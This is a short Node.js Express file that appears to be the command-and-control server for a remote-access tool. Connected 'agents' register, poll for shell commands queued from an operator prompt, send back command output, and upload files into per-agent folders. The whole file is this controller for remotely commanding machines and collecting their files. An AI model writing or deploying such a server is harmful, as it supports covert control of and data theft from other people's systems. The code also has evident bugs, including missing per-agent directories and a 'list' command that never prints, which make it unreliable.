const express = require('express');
const bodyParser = require('body-parser');
const fileUpload = require('express-fileupload');
const process = require('process');
const events = require('events');
const fs = require('fs');

// local imports
const prompt = require('./prompt');

const eventEmitter = new events.EventEmitter();
const app = express();

const PORT = 3000;
const CLIENTS_DIRECTORY = 'clients';

const agents = {}; // connected agents

// ---------- express endpoints ---------- //

// support parsing of application/json POST data
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(fileUpload());

let newId = 0;
app.post('/connect', (req, res) => {
  const agent = req.body;
  const agentJson = JSON.stringify(agent);

  console.log(`New agent ${agentJson} with ID ${newId}`);
  if (!fs.existsSync(CLIENTS_DIRECTORY)) {
    fs.mkdirSync(CLIENTS_DIRECTORY);

    if (!fs.existsSync(`${CLIENTS_DIRECTORY}/${newId}`)) {
      fs.mkdirSync(`${CLIENTS_DIRECTORY}/${newId}`);
    }
  }

  fs.writeFile(`${CLIENTS_DIRECTORY}/${newId}/client_info.json`, agentJson, (err) => {
    if (err) {
      console.log("Error saving the file!");
    }
  });

  agent.commands = [];
  agents[newId] = agent;

  res.end(newId.toString());

  newId++;
});

app.post('/disconnect', (req, res) => {
  const { id } = req.body;
  console.log(`Agent ${JSON.stringify(agents[id])} with ID ${id} has disconnected`);

  delete agents[id];
  res.end('Successfully disconnected');
});

app.post('/command', (req, res) => {
  const { id } = req.body;
  const agent = agents[id];

  if (agent.commands.length === 0) {
    res.end();
  } else {
    res.end(agent.commands.pop());
  }
});

app.post('/upload', (req, res) => {
  const { file } = req.files;
  const { id } = req.body;

  if (agents[id] == null) {
    console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
    return;
  }

  console.log(`Received file from ${id}`);

  file.mv(`${CLIENTS_DIRECTORY}/${id}/${file.name}`, (err) => {
    if (err) {
      return res.status(500).send(err);
    }

    res.send('File uploaded!');
  });
});

app.post('/output', (req, res) => {
  const { output } = req.body;
  console.log('\x1b[32m%s\x1b[0m', output);
  res.end();
});

// start server
app.listen(PORT, () => {
  console.log(`Started on port ${PORT}`);

  // start prompting for user input
  prompt.start('> ', eventEmitter);
});

// ---------- event handlers ---------- //

eventEmitter.on('agent', (id, ...cmd) => {
  if (id == null || cmd.length === 0) {
    console.log('Usage: agent <id> <cmd>');
    return;
  }

  if (agents[id] == null) {
    console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
    return;
  }

  // join cmd array into a string
  const command = cmd.join(' ');

  console.log(`Executing ${command} on agent ${id}`);
  agents[id].commands.push(command);
});

eventEmitter.on('list', () => {
  console.log('Connected agents:');
  for(var i = 0; i < agents.length; i++){
    console.log(`Agent ${i}: ${JSON.stringify(agents[i])}\n`);
  }
});

eventEmitter.on('exit', () => {
  console.log('Shutting down server');
  process.exit();
});
